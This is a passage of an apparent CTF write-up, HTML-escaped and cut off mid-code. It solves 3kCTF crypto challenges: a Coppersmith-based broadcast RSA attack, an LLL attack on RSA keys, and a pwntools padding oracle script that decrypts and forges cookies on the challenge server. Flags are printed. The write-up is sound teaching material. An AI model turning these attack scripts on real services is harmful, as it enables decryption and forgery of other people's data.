  points &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(parse_line, lines[&lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;271&lt;/span&gt;]))
  point_map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; id, x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; points:
    point_map[id] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (x, y)

  im &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#ae81ff&#34;&gt;1850&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;), color&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  draw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ImageDraw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Draw(im)
  
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; id1, id2, _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; edges:
    x1, y1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; point_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id1)
    x2, y2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; point_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id2)
    draw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;line((x1, y1, x2, y2), fill&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

  im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.png&amp;#39;&lt;/span&gt;)

main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/MNaoisT.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code&gt;3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;a-hundred-friends-crypto-496-points&#34;&gt;A hundred friends (Crypto; 496 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RSA&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)
pad &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;UPPER_BOUND)
exp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(m&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;exp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pad, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;n)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a challenge similar to Multicast in PlaidCTF 2017.
Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with &lt;code&gt;exp = 1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We have written the core logic to retrieve the message, given some ciphertexts:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attempt&lt;/span&gt;(subpairs):
  n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(subpairs)

  &lt;span style=&#34;color:#75715e&#34;&gt;# (m + pi)^3 = ci (mod ni)&lt;/span&gt;
  cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], subpairs))
  ns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], subpairs))
  ps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], subpairs))
  nprod &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; reduce(mul, ns)

  gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n)] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
      gs[j][i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binomial(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, j) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(ps[i], j, nprod) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i]
    gs[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((gs[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][i] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; cs[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ns[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i]

  gg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(crt(gs[i], ns)) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
  
  &lt;span style=&#34;color:#75715e&#34;&gt;# Defines e, Zn = Zmod(nprod) and the parameters for the&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# Coppersmith&amp;#39;s attack here. Omitted&lt;/span&gt;

  roots &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(roots) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; roots[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;(Some functions are copied from &lt;a href=&#34;https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage&#34;&gt;mimoo/RSA-and-LLL-attacks&lt;/a&gt;. They are not included here for simplicity)&lt;/p&gt;

&lt;p&gt;However, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn&#39;t small enough for Coppersmith&#39;s attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
  random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(pairs)
  subpairs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pairs[:n]
  attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Attempt {attempt_count}&amp;#39;&lt;/span&gt;)

  m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; attempt(subpairs)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
  m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(m)
  flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bit_length() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, byteorder&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(subpairs)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that there is a chance to return &lt;code&gt;m^2&lt;/code&gt; or &lt;code&gt;m^3&lt;/code&gt;. As I am lazy, I just run the script again until it returns &lt;code&gt;m&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;rsa-textbook-crypto-496-points&#34;&gt;RSA textbook (Crypto; 496 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This challenge is similar to De1CTF&#39;s easyRSA. By reading the same reference paper &lt;a href=&#34;https://link.springer.com/chapter/10.1007/3-540-46701-7_14&#34;&gt;[Howgrave-Graham 1999]&lt;/a&gt;, we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover &lt;code&gt;d1&lt;/code&gt; (the private key that corresponds to &lt;code&gt;e1&lt;/code&gt;). We can then recover &lt;code&gt;phi(n)&lt;/code&gt; and thus compute &lt;code&gt;d&lt;/code&gt; (that corresponds to &lt;code&gt;e&lt;/code&gt;), hence decrypting the ciphertext: &lt;code&gt;3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;you-shall-not-get-my-cookies-crypto-495-points&#34;&gt;You shall not get my cookies (Crypto; 495 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a standard padding oracle attack.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;():
  HOST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;youshallnotgetmycookies.3k.ctf.to&amp;#39;&lt;/span&gt;
  PORT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13337&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; debug
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
    context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;

  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(HOST, PORT)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oracle&lt;/span&gt;(ciphertext):
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; connect()
  payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexlify(ciphertext)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ So... whats your cookie:&amp;#39;&lt;/span&gt;, payload)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ &amp;#39;&lt;/span&gt;)
  res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;That cookie looks burned!&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22&amp;#39;&lt;/span&gt;)

  po &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PaddingOracle(oracle, threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)

  plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; po&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recover(ciphertext)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(plaintext) &lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39; chocolate chip cookie\n\n\n\n\n\n\n\n\n\n&amp;#39;&lt;/span&gt;

  ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; po&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;forge(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Maple Oatmeal Biscuits&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)

  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; connect()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ So... whats your cookie:&amp;#39;&lt;/span&gt;, binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexlify(ciphertext))
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
  &lt;span style=&#34;color:#75715e&#34;&gt;# ~ YES, that is exactly what i wanted!&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle}&lt;/span&gt;
  
main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;once-upon-a-time-crypto-492-points&#34;&gt;once upon a time (Crypto; 492 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;With a bit of code review, it is running a block cipher with block size = 1 (Source: the &lt;code&gt;encrypt_file&lt;/code&gt; method in &lt;code&gt;/src/cipher.c&lt;/code&gt;). The key is also redacted from the source (Source: &lt;code&gt;/src/main.c&lt;/code&gt;). Moreover, surprisingly, the key is &lt;em&gt;not&lt;/em&gt; redacted from the binary.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v45      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span 